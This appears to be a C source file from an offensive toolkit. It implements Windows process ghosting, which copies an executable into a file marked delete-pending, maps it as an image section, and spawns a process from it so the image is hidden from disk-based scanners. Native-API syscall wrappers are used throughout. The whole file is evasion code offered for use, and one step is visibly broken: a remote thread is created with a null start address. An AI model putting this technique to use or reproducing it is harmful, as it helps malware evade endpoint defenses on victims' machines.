#include "Ghosting.h"
#include "Syscalls.h"
#include <stdio.h>
#include <windows.h>

bool ProcessGhosting(const char* realExe, const char* fakeExe, SyscallStruct* St, HANDLE* hProcess, HANDLE* hThread) {
    // Load NTDLL.dll and resolve NtSetInformationFile
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[!] Failed to load ntdll.dll.\n");
        return false;
    }

    NtSetInformationFile_t NtSetInformationFile = (NtSetInformationFile_t)GetProcAddress(hNtdll, "NtSetInformationFile");
    if (NtSetInformationFile == NULL) {
        printf("[!] Failed to resolve NtSetInformationFile.\n");
        FreeLibrary(hNtdll);
        return false;
    }

    // Step 1: Open the real executable
    HANDLE hRealFile = CreateFileA(realExe, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hRealFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open real executable: %s\n", realExe);
        FreeLibrary(hNtdll);
        return false;
    }

    // Step 2: Create the fake file for ghosting
    HANDLE hFakeFile = CreateFileA(fakeExe, DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFakeFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create fake executable.\n");
        CloseHandle(hRealFile);
        FreeLibrary(hNtdll);
        return false;
    }

    // Step 3: Copy the real executable's content to the fake file
    DWORD fileSize = GetFileSize(hRealFile, NULL);
    unsigned char* fileBuffer = (unsigned char*)malloc(fileSize);
    DWORD bytesRead = 0;
    if (!ReadFile(hRealFile, fileBuffer, fileSize, &bytesRead, NULL)) {
        printf("[!] Failed to read real executable.\n");
        CloseHandle(hRealFile);
        CloseHandle(hFakeFile);
        free(fileBuffer);
        FreeLibrary(hNtdll);
        return false;
    }

    DWORD bytesWritten = 0;
    if (!WriteFile(hFakeFile, fileBuffer, fileSize, &bytesWritten, NULL)) {
        printf("[!] Failed to write to fake executable.\n");
        CloseHandle(hRealFile);
        CloseHandle(hFakeFile);
        free(fileBuffer);
        FreeLibrary(hNtdll);
        return false;
    }

    free(fileBuffer);
    CloseHandle(hRealFile);

    // Step 4: Mark the fake file for deletion (delete-pending state)
    IO_STATUS_BLOCK ioStatus;
    FILE_DISPOSITION_INFORMATION fdi = { TRUE };
    if (NtSetInformationFile(hFakeFile, &ioStatus, &fdi, sizeof(fdi), (FILE_INFORMATION_CLASS)13) != 0) {
        printf("[!] Failed to set file for deletion.\n");
        CloseHandle(hFakeFile);
        FreeLibrary(hNtdll);
        return false;
    }

    // Step 5: Create a section for the fake file
    HANDLE hSection = NULL;
    NTSTATUS status = St->NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFakeFile);
    if (status != 0) {
        printf("[!] NtCreateSection failed with error: 0x%08X\n", status);
        CloseHandle(hFakeFile);
        FreeLibrary(hNtdll);
        return false;
    }

    // Step 6: Create the ghosted process from the section
    status = St->NtCreateProcess(hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), TRUE, hSection, NULL, NULL);
    if (status != 0) {
        printf("[!] NtCreateProcess failed with error: 0x%08X\n", status);
        CloseHandle(hFakeFile);
        CloseHandle(hSection);
        FreeLibrary(hNtdll);
        return false;
    }

    // If a thread is not created in the ghosting process, create one here
    *hThread = CreateRemoteThread(*hProcess, NULL, 0, NULL, NULL, CREATE_SUSPENDED, NULL);
    if (*hThread == NULL) {
        printf("[!] Failed to create thread in ghosted process.\n");
        CloseHandle(*hProcess);
        CloseHandle(hFakeFile);
        CloseHandle(hSection);
        FreeLibrary(hNtdll);
        return false;
    }

    printf("[+] Process ghosted successfully.\n");

    // Clean up handles
    CloseHandle(hFakeFile);
    CloseHandle(hSection);
    FreeLibrary(hNtdll);

    return true;
}
